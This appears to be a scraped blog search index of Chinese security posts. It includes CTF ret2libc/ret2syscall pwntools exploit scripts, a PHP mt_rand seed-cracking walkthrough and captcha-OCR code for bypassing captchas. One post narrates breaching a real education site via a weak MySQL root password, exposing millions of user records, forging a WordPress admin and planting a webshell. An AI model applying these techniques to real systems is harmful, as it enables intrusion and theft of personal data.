18086:80 \\ --name freshrss freshrss/freshrss","link":"2018/12/28/ubuntu%E4%B8%ADDocker%E7%9A%84%E5%AE%89%E8%A3%85-%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91-%E7%AE%80%E5%8D%95%E5%91%BD%E4%BB%A4/"},{"title":"web师傅们的博客收集","text":"坏男孩 Sky’s blog PaperTiger’s blog BUUCTF的wp(随时弃坑) | Mrkaixin自留地 ctf中常见的PHP漏洞小结 - 先知社区 代码审计练习 · Ywc’s blog 赵 – 为心中的美好而战 SUCTF2019 web部分赛题复盘 - stepone4ward的博客 - CSDN博客 X1cT34m’s BLOG | 小西的博客 | Xiaoxi’s Blog r3kapig | United Team of Eur3kA and FlappyPig Yongheng Chen (Ne0) | Good defense requires a detailed knowledge of offense. ROIS Blog - Hack for fun 云袭2001’s blog 小刀志 j00ru//vx tech blog TECH BLOG — Improsec | improving security Alex Ionescu’s Blog – Windows Internals, Thoughts on Security, and Reverse Engineering SUS Vulnerability Component - CmsEasy - Knownsec Seebug Vulnerability Platform 2019UNCTF · CTF Writeup 404 Not Found 首页 | 离别歌 Pupiles blog K0rz3n’s Blog | Shell-is-Only-the-Beginning Lnyassss – 太阳太阳给我们带来七色光彩 Links - 薇拉航线 Home - cdxy louys-代码审计入门中 Blog | xmsec - 陌小生 关于我们 - 网络尖刀（1AQ TEAM）团队1aq.com Index - Virink’s Blog Nearg1e - Web Develop&amp;Security / 安全研究 / 漏洞挖掘 / 安全开发 / Pyer / Anime nmask’s Blog - 风陵渡口 江水 tom0li – Web sec RFID pentest Researcher CTF挑战-黑客文章 七友’s Blog 关于 | berTrAM’s Blog 风之栖息地|hurricane618’s blog 2kb.ME | 两颗币 N0rth3ty’s Blog About me | p0desta’s blog | WEB安全、代码审计、安全开发、20届毕业本科生 baozi’s Blog | 我还想再试一次 LoRexxar’s Blog Atum Swing’Blog 有恨无人省 Blog of f1sh – Try Hard. 0x584A m3lon 0x584A Mr.R的博客 | By Blog 国光 about | Yiruma Seaii’s Blog p0desta’s blog | WEB安全、代码审计、安全开发、20届毕业本科生 道萝岗特森’s Blog V0W’s Blog evi0s’ Blog - path of heart &amp; passion for code Homura’s Blog MozhuCY’s blog 梅子酒の笔记本 ] 丶诺熙丨5am3 Learning Man p0’s blog | 破 - 关注网络安全 tr1ple - 博客园 MoR03r’s Blog 腹黑’s Blog 天堂空气 2018反思总结 | Mang0 的成长之路 | Mang0 | 网络安全 | 安全技术 | CTF|WEB 安全 | 数据科学安全 Ph0rse’s Blog 归档 | Time 渗透测试面试总结 | Sriracha :) Smi1e | AdminTony’s Blog - 专注于渗透测试|信息安全|网络攻防对抗等领域 打代码的怪兽 CodeMonster GetFlag’s Blog 郁离歌丶的博客 – 远去的梦想与荣光。 Cosmos‘s blog 境界的彼方 greyd0g’ blog Brucetg’s Blog Hpdoger Hu3sky’s blog Kingkk’s Blog 归档 | Mochazz’s blog SG’s Blog yuf1sher’s blog Yokeen’s blog JAVA审计P0rZ9’s blog kn0ck’s blog | 一群CTF爱好者 geez博客 Hexman的自习室 only_free blog 娱乐渗透某黑阔站 - Hexman的自习室 Marblue’s World Jayl1n’s Blog Rj45’s blog Page 1 | Altm4nz evoA’s Blog - eval A Virtua1の日常 - Hack for fun.Enjoy coding. Light Cube – 愿用自己的力量，为这个世界增添一份色彩。 一步一世界 JrXnm Se7en’s Blog|Learn and live 淚笑 - 博客园 wywwzjj’s Blog Xi4or0uji 菠萝吹雪’s Studio Zedd’s Blog 惊蛰 | Let life be beautiful like summer flowers and death like autumn leaves. R1dd1er’s blogs 云屿’s Blog Tiaonmmn’s Littile House Mr_Song – 我想要很多，我所知甚少。 kagi| - 博客园","link":"2019/11/19/web%E5%B8%88%E5%82%85%E4%BB%AC%E7%9A%84%E5%8D%9A%E5%AE%A2%E6%94%B6%E9%9B%86/"},{"title":"一次有趣的安全事故-背锅侠","text":"重要声明本文涉及的所有漏洞已通知厂商并已修复，本人从未参与任何勒索犯罪等违法行为 第一回合-相遇一个晴朗的夜晚，书鱼看不懂书，写不来代码，排位连跪，于是康了一康补天的src列表，翻了翻牌子找了到一个幸运站点（以下称为A站。开始渗透，这是一个教育网，看起来挺大的，页面上测了测，注入点fuzz了一下没啥结果 第二回合-找到破绽然后开始了子域名，旁站等查询，发现了db.A站，居然只开了3306。这不是脱光了等我*** 。于是爆破一梭子下去，root密码居然是弱密码里面居然有260多万的用户信息，测试找一下密码为12345678的md525d55ad283aa400af464c76d713c07ad的用户，挺多的，测试了一下到网站上-能正常登录 第三回合-弱不禁风拿到mysql找到了好多admin用户的密码md5-还行管理员没有弱口令没解密出来，现在有3个planplan A:伪造一个admin数据(没错，admin真的可以为所欲为)但是伪造admin因为是基于RBAC的权限管理，还嘚动其他的表plan B:直接修改管理员密码md5为25d55ad283aa400af464c76d713c07ad貌似很暴力-很爽。但是想了一下进入后台还要找其他方法getshell-并且这个网站非常弱（几百万人的网站居然如此弱），我查询的时候，网页就开始卡了，我担心进入后台看到不该看的，遇到不该遇到的东西，这个就当最后杀手锏吧plan C：mysql提权，先试了一下直接写木马，没有写权限，udf和mof就没敢玩了，百万级的站，真怕崩了背锅（背锅伏笔）总的来说这个网站脆肉得一批 第四回合-新的发现首先检查了一下这个子域名和ip和主站的ip是一样的，意味着是同一台服务器。于是查看了一下有没有一些其他的数据。惊喜：发现了一个wordpress的整套数据库,那么有同学会问了，只有数据库，怎么知道站点在哪呢，或者说如何确定和主站同一站点呢，玩过wordpress的师傅知道wp_options里面有site相关的信息，包括url等，就很nice了这个站点和主站也还在一个服务器上 第五回合-伪造身份虽然有wordpress密码爆破的一些工具，但是还是先伪造一个密码为hello（md为5d41402abc4b2a76b9719d911017c592）的用户，这里有一个知识点，wordpress的密码虽然数据库里他们的带$等一些其他符号，但是直接md5值也是可以的尝试登录 第六回合-CTF真香于是拿着noname-hello登录站点居然这么高级，第一想法就是可能需要内网登录，回想起ctf-web入门的题目，改客户端ip，当时觉得没啥用，但是也是拿来测试一下wtf-真就可以了-CTF诚不欺我，有些知识学的时候觉得没啥用，但是用的时候就真香了-顺利到了后台 第七回合-gay特血儿可能男人就是这样，没有getshell终不停止，就像那个女*****再次声明：本文由于安全测试，所以在不影响服务的前提下增加了木马操作-测试结束后把一切危险痕迹删除了这里noname你要改成admin角色，数据库有admin权限真可以为所欲为，wp后台getshell还是非常简单的，在模板里动手，加一些马啥的然后 第八回合-终章？？getshell后因为网站毕竟脆弱，所以也没有进一步深入，毕竟也是几百万的数据，于是把上面的报告全部提交给补天平台了。然后删除了马，关闭了navicat，burp,navicat投入到我的小床，看似一切结束的，我等着第二天补天给我一些金币我兑换我看中的衣服~ 第九回合-背锅侠上线于是第二天补天管理员找我，让我上去确定网站的数据异常是否于我有关？我上去看了一下，wtf所有的数据都删除了，只剩下一张warning表大概意思是，敲诈0.06比特币，否则如果未来10天内没有收到付款，他们呢将公开数据库或以其他方式使用它们本以为这玩意只有传说中有，真就遇上了呗，还是就隔了一个晚上，难不成是我客户端被劫持了？于是我一五一十告诉了补天我的行为，尽量脱干净自己的问题-删除了和那个网站所有的关联。 第十回合-真结局补天那边也相信了我，毕竟我提交了报告，不会那么蠢再勒索一下，所以最后是我拿到了一笔币换了一件衣服-至于泄露了没，勒索成功了没，管他妈了，衣服还是挺喜欢的","link":"2020/03/21/%E4%B8%80%E6%AC%A1%E6%9C%89%E8%B6%A3%E7%9A%84%E5%AE%89%E5%85%A8%E4%BA%8B%E6%95%85-%E8%83%8C%E9%94%85%E4%BE%A0/"},{"title":"万物美好，世间温柔","text":"整理文件发现了几张初中高中画的画，当初也曾经想过大学学美术，最后还是跟着潮流学了计算机，曾经想过如果家里有钱，我还真去学美术的（当然也不是说学美术就赚不到钱，但是学计算机毕竟现在能独立生活，也曾经想过在大学里，左手程式右手诗，有空就画画，吉他，读诗（想想好中二啊）但是想想而来，入大学到现在，这个“有空”从何而来，也算是我背叛了当初的梦想而苟活至今，当然这也是时代的必然发展，就好比入了大学你有多久没开心一笑了。大学时间过的太快，真的太快，快到你没空停下来看一场电影，但是高三却能追完整个火影。突然看到曾经的画，对于当初那份快乐，现在除了鼻子酸酸，真的只有回味了。望你我珍惜大学时光，不负韶华。想了一下还是留几张照片放这里，希望自己能好好生活当一个正常人，当然从技术而言，肯定没法比艺术生，闻道有先后，术业有专攻 给老姐的生日礼物 ] 大爱鸣雏 夏目 大爱火影（好中二啊 wsl 奇奇怪怪的一些垃圾 我也不知道是谁的谁 唯一喜欢的就是右图辣个蓝人 总感觉这个忙碌的人和我有某种关系♂ ![](2.jpg)","link":"2018/12/27/%E4%B8%87%E7%89%A9%E7%BE%8E%E5%A5%BD%EF%BC%8C%E4%B8%96%E9%97%B4%E6%B8%A9%E6%9F%94/"},{"title":"个人用的导航栏","text":"安全资源平台CTFWiki先知社区Sec-Newspaper.seebugfreebuf知道创宇洞悉漏洞安全课漏洞银行看雪论坛看雪学院渗透师导航乌云镜像国家信息安全漏洞库教育行业漏洞报告平台0day5漏洞时代网络尖刀 CTF题目 Pwnhttp://pwnable.kr/https://pwnable.tw/challenge/https://github.com/bash-c/pwn_repo Webhttps://github.com/Audi-1/sqli-labshttps://github.com/c0ny1/upload-labshttps://github.com/CTFTraining/CTF_WEB_SOURCEhttps://github.com/hongriSec/Web-Security-Attackhttps://github.com/hongriSec/PHP-Audit-Labshttps://github.com/80vul/phpcodzhttp://xss-quiz.int21h.jp/ 刷题平台i春秋竞赛训练营https://buuoj.cn/https://www.jarvisoj.com/challengeshttps://ctf.bugku.com/ wp和复现关于ThinkPHP框架的历史漏洞分析集合https://github.com/susers/Writeupshttps://www.ctfwp.com/articals/all.htmlhttps://github.com/p4-team/ctfhttps://github.com/ctfs/write-ups-2017https://github.com/CTFTraining/CTFTrainingwebshell收集项目CTF比赛题目仓库-2019红日安全https://xz.aliyun.com/u/10394https://github.com/balsn/ctf_writeupsqlilabs-wphttps://ctfbook.ph0en1x.com/ 渗透学习的资料https://www.vulnhub.com/d靶场https://github.com/az0ne/Permeablehttps://github.com/uknowsec/Active-Directory-Pentest-Notes各种漏洞poc、Exp的收集或编写云悉资产-子域名，ip等信息收集https://www.t00ls.net/https://github.com/ethicalhack3r/DVWA从零开始内网渗透学习子域名收集工具cms指纹查询云悉cms指纹查询 漏洞库知道创宇cms漏洞查询sec_new_cms漏洞查询https://cxsecurity.com/issue/WLB-2018040046https://www.exploit-db.com/exploits/44405http://vulhub.org.cn/vulns/25?exploit=on&amp;view=global CTF工具加解密工具大全https://pmd5.com/Md5在线解密https://www.somd5.com/Md5在线解密brainfuckjsfuckbase16-32-64hash计算whois大整数分解GitHackGitHacker（可恢复完整 Git 仓库）dirsearch.hg 文件恢复ds_store_expsvnExploitsqlmapCaptfEncoder跨平台网络安全工具套件一些常用的木马-文件上传题目的一些小工具php在线在线运行各版本的phppytho在线n反编译 程序员用工具在线正则代码格式工具js代码格式工具KMS工具word文档中的代码高亮在线markdown转word、pdf、html生成banner谷歌浏览器插件下载共享面板https://demo.codimd.org/超级简历在线制图下载vc++代码在线运行https://code.y444.cn/ 多媒体工具在线多媒体格式转换生成二维码回车桌面高清壁纸桌面壁纸精品壁纸获得视频的每一帧免费的ppt模板在线从图片中颜色提取rgb取色获得qq头像每日一句诗宋词三百首精品翻译课程互联网上收集的各种炫酷特效源码视频添加字幕 一些文档教程菜鸟教程mybatis官方教程springboot教程-非官方spring官方教程django中文文档flask中文文档vue-cli官方教程vue-admin仓库 一些有趣的笔记记录各种学习笔记(算法、Java、数据库、并发……)2019年最新总结，阿里，腾讯，百度，美团，头条等技术面试题目个人准备渗透测试和安全面试的经验之谈信息安全面试题汇总信息安全行业从业者(Web安全/渗透测试方向)面试题目404 Not Found的安全算法知识体系网络信息安全从业者面试指南 一些有趣的东西白嫖前端源码a20s网盘脑图收集电子书下载2018-2020青年安全圈-活跃技术博主/博客网页转成markdown信息安全从业者书单推荐nuaa-BookCornerleetcode示例截屏获得文字内容maven包","link":"2019/11/19/%E4%B8%AA%E4%BA%BA%E7%94%A8%E7%9A%84%E5%AF%BC%E8%88%AA%E6%A0%8F/"},{"title":"从ret2libc中学习GOT表和PLT表以及动态计算偏移","text":"所谓教材:就是把一个简单易懂的名词,扩写成一堆谁也看不懂的句子（假的1.重定位确定程序运行时地址的过程就是这里重定位(Relocation)。 2.链接时重定位链接阶段是将一个或多个中间文件(.o文件)通过链接器将它们链接成一个可执行文件，主要做的事情有 对各个中间文件的同名section进行合并对代码段，数据段等进行地址分配进行链接时重定位 两种情况： 1.如果是在其他中间文件中已经定义了的函数，链接阶段可以直接重定位到函数地址2.如果是在动态库中定义了的函数，链接阶段无法直接重定位到函数地址，只能生成额外的小片段代码，也就是PLT表，然后重定位到该代码片段 3、运行时重定位运行后加载动态库，把动态库中的相应函数地址填入GOT表，由于PLT表是跳转到GOT表的，这就构成了运行时重定位 4、PLT表和GOT表动态编译其实就是在实际内存中一份，但是在各进程的虚拟地址中“虚拟”一份，这样可以大大节省空间，但是这样会导致重定位非常困难，一个解决方法是给一种动态库一个确定的虚拟内存区，但是这样肯定是不行的（如果动态库很多，内存爆了233，所以有这么一个位置无关代码（PIC），而PLT表和GOT表就是用来无论这个动态库丢内存哪个区域都能调用到。有一个原则是代码段（PLT表）原则上是不能修改的，只能改数据段（GOT表）ELF将GOT拆为了两个表叫做“.got”,”.got.plt”。其中 .got 用来保存全局变量的引用地址，.got.plt 用来保存函数引用的地址 萌新问题1、不要GOT表可不可以 意思是plt表直接保存jmp *地址肯定是不行的，因为plt是代码段，我们尽量不让他修改 萌新问题2、不要PLT表可不可以也是不行的，因为GOT表是数据段，不能实现函数跳转等操作当然延迟绑定的实现具体细节还是很复杂但是很精妙的，感兴趣可以看看程序员自我修养。 ret2libcret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置(即函数对应的 got表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。 ROPgadget --binary ret2libc1 --string &apos;/bin/sh&apos; payload的布局结构： A*N + system_addr + fake_ret + system_arg fake_ret是下一次调用的返回地址 #!/usr/bin/env pythonfrom pwn import *sh = process(&apos;./ret2libc1&apos;)binsh_addr = 0x8048720system_plt = 0x08048460payload = flat([&apos;a&apos; * 112, system_plt, &apos;b&apos; * 4, binsh_addr])sh.sendline(payload)sh.interactive() ret2libc2该题目与例 1 基本一致，只不过不再出现 /bin/sh 字符串，但是有一个puts函数，我们写到bss段，然后执行 from pwn import *sh = process(&apos;./ret2libc2&apos;)system = 0x08048490gets_addr=0x08048460pop_ebx = 0x0804843dbuff2_addr=0x0804A080#payload = flat([&quot;a&quot;*112,gets_addr,pop_ebx,buf2,system,&quot;aaaa&quot;,buf2])payload = flat([&quot;a&quot;*112,gets_addr,system,buff2_addr,buff2_addr])sh.sendline(payload)sh.sendline(&apos;/bin/sh&apos;)sh.interactive() 为甚么两个payload都可以呢payload1:调用写函数之后，函数到了返回地址上，但是栈还多了上一次的参数buf2，所以我们找一个pop把栈平衡一下到达system函数调用，buf2重新作为参数，之后返回地址为“aaaa”,由于全程没动ebp，所以不需要管保留的ebp什么的payload2:在 gets() 函数调用完后，在返回地址处覆盖上 system() 的地址将 gets() 函数的参数 buf 地址当成返回地址，再在后面加上 system() 函数的参数 buf。 ret2libc3这题就要先泄露libc地址思路 1.泄露 一个调用函数的 地址2.获取 libc 版本3.获取 system 地址与 /bin/sh 的地址4.再次执行源程序5.触发栈溢出执行 system(‘/bin/sh’) 获取libc版本使用LibcSearcherpayload # -*- coding: utf-8 -*- from pwn import *from LibcSearcher import *sh=process(&quot;./ret2libc3&quot;)ret2libc3=ELF(&quot;./ret2libc3&quot;)print(&quot;main&quot;+str(hex(ret2libc3.symbols[&apos;main&apos;])))payload=&apos;f&apos;*112+p32(ret2libc3.plt[&apos;puts&apos;])+p32(ret2libc3.symbols[&apos;main&apos;])+p32(ret2libc3.got[&apos;puts&apos;])sh.recvuntil(&apos;?&apos;) sh.sendline(payload)puts=u32(sh.recv(4))print(&apos;puts的地址&apos;+hex(puts))libc=LibcSearcher(&apos;puts&apos;,puts)print(&quot;libc的版本：&quot;+str(libc))libcbase=puts-libc.dump(&apos;puts&apos;)print(&quot;libc基址:&quot;+str(hex(libcbase)))system=libcbase+libc.dump(&apos;system&apos;)bin_sh=libcbase+libc.dump(&apos;str_bin_sh&apos;)print(&quot;system函数地址:&quot;+str(hex(system)))print(&quot;bin_sh地址:&quot;+str(hex(bin_sh)))payload=&apos;f&apos;*104+p32(system)+p32(0xdeadbeef)+p32(bin_sh)sh.sendline(payload)sh.interactive()#print(main) 解释我们先找到puts函数的plt表，这样可以直接调用puts函数输出我们要看的东西puts参数为p32(ret2libc3.got[&apos;puts&apos;]),我们在每次运行的时候把got表中的puts(其实是一个指针)，输出，这样就把puts函数在这个进程的虚拟地址输出了，然后在一个动态库中相对偏移是不变的，找到system和&apos;/bin/sh&apos;虚拟地址。我们在输出的时候把返回地址设置为main函数就可以再次运行栈溢出而且动态库在虚拟地址中位置不变（Orz太精妙了 动态调整栈的长度之前静态计算栈溢出的偏移，太难了容易算错，然后曹师傅说动态调试就简单了1、先略微调高一点2、设置断点在ret上3、运行，断点截住后查看栈多出了多少比如本题的104，先设置为110然后发现多了6个f字符，所以实际偏移为110-6=104 ret2syscallret2syscall，即控制程序执行系统调用，获取 shell。简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell其中，该程序是 32 位，所以我们需要使得 系统调用号，即 eax 应该为 0xb第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。第二个参数，即 ecx 应该为 0第三个参数，即 edx 应该为 0 寻找 gadgets的方法，我们可以使用 ropgadgets 这个工具 ROPgadget --binary rop --only &apos;pop|ret&apos; | grep &apos;eax&apos;ROPgadget --binary rop --only &apos;pop|ret&apos; | grep &apos;ebx&apos;ROPgadget --binary rop --string &apos;/bin/sh&apos; ROPgadget --binary rop --only &apos;int&apos; #!/usr/bin/env pythonfrom pwn import *sh = process(&apos;./rop&apos;)pop_eax_ret = 0x080bb196pop_edx_ecx_ebx_ret = 0x0806eb90int_0x80 = 0x08049421binsh = 0x80be408payload = flat( [&apos;A&apos; * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])sh.sendline(payload)sh.interactive() ps:几个DGB常用命令 -q 参数不显示欢迎信息等-n 不加载任何插件，使用原生 gdbinfo 后面跟上想要查看的信息，如函数信息 info functionsb/breakpoint 设置断点del/delete breakpoints n 删除断点，n是断点编号，可用info breakpoints命令查看断点信息start 命令启动程序并停在开辟完主函数栈帧的地方c/continue 继续执行程序，遇到断点停下f/finish 结束程序r/run 运行程序，遇到断点停下ni 单步步过，一步一步执行指令遇到函数调用时直接执行完整个函数si 单步步入，一步一步执行指令遇到函数调用时跳转到函数内部vmmap 查看内存映射checksec 查看程序的防护措施pdisass/disassemble 查看当前函数帧的反汇编代码，前一个命令有高亮显示只是需要安装pwndbg插件，后面一个命令时gdb自带的命令无高亮显示p/print 打印信息，如寄存器 p $ebpx/&lt;n/f/u&gt; &lt;addr&gt; 查看某地址处的值，n/f/u 参数为可选，n代表想要查看多少个内存单元即从当前地址开始计算，每个内存单元的大小由后面的u参数指定；f表示显示格式，如s表示字符串形式，i为指令形式；u指定内存单元大小，b(一个字节)、h(双字节)、w(四个字节)、g(八字节)默认为w； 后面跟上x代表以十六进制的形式查看变量set *addr = value 设置某个地址的值 ps:read函数 ssize_t read(int fd, void *buf, size_t count); 函数的参数【int fd】：这个是文件指针函数的参数【void *buf】：读上来的数据保存在缓冲区buf中，同时文件的当前读写位置向后移函数的参数【size_t count】：是请求读取的字节数。若参数count 为0, 则read()不会有作用并返回0. 返回值为实际读取到的字节数, 如果返回0read()会把参数fd 所指的文件传送count个字节到buf指针所指的内存中","link":"2019/09/18/%E4%BB%8Eret2libc%E4%B8%AD%E5%AD%A6%E4%B9%A0GOT%E8%A1%A8%E5%92%8CPLT%E8%A1%A8%E4%BB%A5%E5%8F%8A%E5%8A%A8%E6%80%81%E8%AE%A1%E7%AE%97%E5%81%8F%E7%A7%BB/"},{"title":"从一次删除带特殊字符文件名的文件中学习Linux索引节点inode","text":"楔子在很久很久之前，一个很傻很傻的刘萌新不知何因上传了一个带特殊字符文件名的文件到服务器中，于是他想着怎么删除。 方法1、从面板中删除，然而面板和萌新一样垃圾，在文件管理中根本不显示这个文件方法2、xshell连接，rm -rf一梭子下去 ，但是文件名你不能输入，并且同目录下有其他重要的东西。然后你会想通过 | grep 啦正则啦 一梭子来找到那个文件，没错本萌新就是这样的 ε=ε=ε=┏(゜ロ゜;)┛。但是还是找不到直到你发现了一个叫inode的东西 1、inode简介理解inode，要从文件储存说起。文件储存在硬盘上，硬盘的最小存储单位叫做”扇区”（Sector）。每个扇区储存512字节（相当于0.5KB）。操作系统读取硬盘的时候，不会一个个扇区地读取，这样效率太低，而是一次性连续读取多个扇区，即一次性读取一个”块”（block）。这种由多个扇区组成的”块”，是文件存取的最小单位。”块”的大小，最常见的是4KB，即连续八个 sector组成一个 block。文件数据都储存在”块”中，那么很显然，我们还必须找到一个地方储存文件的元信息，比如文件的创建者、文件的创建日期、文件的大小等等。这种储存文件元信息的区域就叫做inode，中文译名为”索引节点”。 2、inode的内容inode包含文件的元信息，具体来说有以下内容： * 文件的字节数 * 文件拥有者的User ID * 文件的Group ID * 文件的读、写、执行权限 * 文件的时间戳，共有三个：ctime指inode上一次变动的时间，mtime指文件内容上一次变动的时间，atime指文件上一次打开的时间。 * 链接数，即有多少文件名指向这个inode * 文件数据block的位置 可以用stat命令，查看某个文件的inode信息： [root@localhost /]# stat example.txt 3、inode号码每个inode都有一个号码，操作系统用inode号码来识别不同的文件。 这里值得重复一遍，Unix/Linux系统内部不使用文件名，而使用inode号码来识别文件。对于系统来说，文件名只是inode号码便于识别的别称或者绰号。表面上，用户通过文件名，打开文件。实际上，系统内部这个过程分成三步：首先，系统找到这个文件名对应的inode号码；其次，通过inode号码，获取inode信息；最后，根据inode信息，找到文件数据所在的block，读出数据。 使用ls -i命令，可以看到文件名对应的inode号码： [root@localhost /]# ls -i test.txt 6970 test.txt 4、硬链接一般情况下，文件名和inode号码是”一一对应”关系，每个inode号码对应一个文件名。但是，Unix/Linux系统，允许多个文件名指向同一个inode号码。这意味着，可以用不同的文件名访问同样的内容；对文件内容进行修改，会影响到所有文件名；但是，删除一个文件名，不影响另一个文件名的访问。这种情况就被称为”硬链接”（hard link）。 5、软链接除了硬链接以外，还有一种特殊情况。文件A和文件B的inode号码虽然不一样，但是文件A的内容是文件B的路径。读取文件A时，系统会自动将访问者导向文件B。因此，无论打开哪一个文件，最终读取的都是文件B。这时，文件A就称为文件B的”软链接”（soft link）或者”符号链接（symbolic link）。这意味着，文件A依赖于文件B而存在，如果删除了文件B，打开文件A就会报错：”No such file or directory”。这是软链接与硬链接最大的不同：文件A指向文件B的文件名，而不是文件B的inode号码，文件B的inode”链接数”不会因此发生变化。ln -s命令可以创建软链接。 当我们知道有inode号码这么个东西后，那么刘萌新的问题就能迎刃而解了","link":"2019/03/13/%E4%BB%8E%E4%B8%80%E6%AC%A1%E5%88%A0%E9%99%A4%E5%B8%A6%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E6%96%87%E4%BB%B6%E5%90%8D%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%AD%E5%AD%A6%E4%B9%A0Linux%E7%B4%A2%E5%BC%95%E8%8A%82%E7%82%B9inode/"},{"title":"伪随机数","text":"在比赛中多次遇到了伪随机数的问题-总结一下在web安恒测试决赛的题目 &lt;?php#这不是抽奖程序的源代码！不许看！header(&quot;Content-Type: textml;charset=utf-8&quot;);session_start();if(!isset($_SESSION[&apos;seed&apos;])){$_SESSION[&apos;seed&apos;]=rand(0,999999999);}mt_srand($_SESSION[&apos;seed&apos;]);$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str=&apos;&apos;;$len1=20;for ( $i = 0; $i &lt; $len1; $i++ ){ $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); }$str_show = substr($str, 0, 10);echo &quot;&lt;p id=&apos;p1&apos;&gt;&quot;.$str_show.&quot;&lt;/p&gt;&quot;;if(isset($_POST[&apos;num&apos;])){ if($_POST[&apos;num&apos;]===$str){ echo &quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}&lt;/p&gt;&quot;; } else{ echo &quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;; }}show_source(&quot;check.php&quot;); 参考几篇博客http://wonderkun.cc/index.html/?p=585https://www.anquanke.com/post/id/168308思路就很明显了 Hack1、安装php_mt_seedhttps://www.openwall.com/php_mt_seed/随便下载一个版本，放到linux下make就行了使用的话直接 root@kali:~/桌面/php_mt_seed-3.4# ./php_mt_seed 42 42 0 61 48 48 0 61 0 0 0 61 37 37 0 61 2 2 0 61 11 11 0 61 54 54 0 61 1 1 0 61 37 37 0 61 2 2 0 61 2、整理本题数据我们先访问一下拿到前10位从博客参考中我们能看到，还需要整理 &lt;?php$str = &quot;GMaBclSbBc&quot;;$randStr = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; for($i=0;$i&lt;strlen($str);$i++){ $pos = strpos($randStr,$str[$i]); echo $pos.&quot; &quot;.$pos.&quot; &quot;.&quot;0 &quot;.(strlen($randStr)-1).&quot; &quot;; //整理成方便 php_mt_seed 测试的格式 //php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]]}echo &quot;\\n&quot;;?&gt; 生成了 42 42 0 61 48 48 0 61 0 0 0 61 37 37 0 61 2 2 0 61 11 11 0 61 54 54 0 61 1 1 0 61 37 37 0 61 2 2 0 61 3、使用php_mt_seedroot@kali:~/桌面/php_mt_seed-3.4# ./php_mt_seed 42 42 0 61 48 48 0 61 0 0 0 61 37 37 0 61 2 2 0 61 11 11 0 61 54 54 0 61 1 1 0 61 37 37 0 61 2 2 0 61 Pattern: EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62Found 0, trying 536870912 - 570425343, speed 115704937 seeds per second seed = 552481257Found 1, trying 4261412864 - 4294967295, speed 109971944 seeds per second Found 1 拿到种子552481257一般而言是会返回你php版本号的，一定要使用特定的版本才能得到正确下一步 4、还原数据&lt;?phpmt_srand(552481257);$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str=&apos;&apos;;$len1=20;for ( $i = 0; $i &lt; $len1; $i++ ){ $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); }echo $str;?&gt; 输出GMaBclSbBcDfVku346h4","link":"2019/12/03/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/"},{"title":"使用tesseract和Pillow简单识别验证码","text":"楔子之前的爬虫总是被验证码卡住，无论是爬某数据，还是爆破某东西，有了验证码貌似就GG,发现了一个不错的库很简答的识别简单的验证码，就是安装不能直接pip安装 一、win10安装tesseractGithub地址,找了半天没找到在哪下win10安装包，orz备用一个下载地址，下载一个就行比如tesseract-ocr-setup-3.05.01.exe，然后安装之后需要配置环境变量（和jdk，python一样），具体就是\\tesseract\\Tesseract-OCR,在终端输入tesseract为↓ 二、安装python相关的包pip install pytesseractpip install pillow 有个很恶心的地方，感觉之前的crypto包也有类似的问题在\\python3\\Lib\\site-packages\\pytesseract中的pytesseract.py第三十五行 tesseract_cmd = &apos;{你自己tesseract安装的目录}&apos;比如我的↓tesseract_cmd = &apos;C:/tesseract/Tesseract-OCR/tesseract&apos; 三、简单介绍一下验证码种类1）图形验证码图形验证码应该是最简单的一种验证码，这种验证码是最早出现，也是目前最常见的，一般组成规则是4个字母或数字或混合组成;比如某校的某站2）滑动验证码就是滑动拼图吧，比如哔哩哔哩3）点触验证码国外网站居多 三、最简单的车这是最简单的一类验证码有了之前的的安装，这样的验证码就很简单 # -*- coding: UTF-8 -*_from PIL import Imagefrom pytesseract import *im = Image.open(&apos;1.jpg&apos;)print(pytesseract.image_to_string(im)); 四、优化程序，排除干扰很多地方的验证码是有干扰的比如中间多一根横线，比如某教务处首先可以灰度和二值化处理 #!usr/bin/env python# coding:utf-8from pytesseract import *from PIL import Imageimage = Image.open(&quot;4.jpg&quot;)image = image.convert(&apos;L&apos;) #转化为灰度图threshold = 127 #设定的二值化阈值table = [] #table是设定的一个表，下面的for循环可以理解为一个规则，小于阈值的，就设定为0，大于阈值的，就设定为1for i in range(256): if i &lt; threshold: table.append(0) else: table.append(1)image = image.point(table,&apos;1&apos;) #对灰度图进行二值化处理，按照table的规则（也就是上面的for循环）result = pytesseract.image_to_string(image) #对去噪后的图片进行识别print(result) 很可惜上面脚本上不了教务处下面的正在魔改中。。。ing import osimport pytesseractfrom PIL import Imagefrom collections import defaultdict# tesseract.exe所在的文件路径# 获取图片中像素点数量最多的像素def get_threshold(image): pixel_dict = defaultdict(int) # 像素及该像素出现次数的字典 rows, cols = image.size for i in range(rows): for j in range(cols): pixel = image.getpixel((i, j)) pixel_dict[pixel] += 1 count_max = max(pixel_dict.values()) # 获取像素出现出多的次数 pixel_dict_reverse = {v:k for k,v in pixel_dict.items()} threshold = 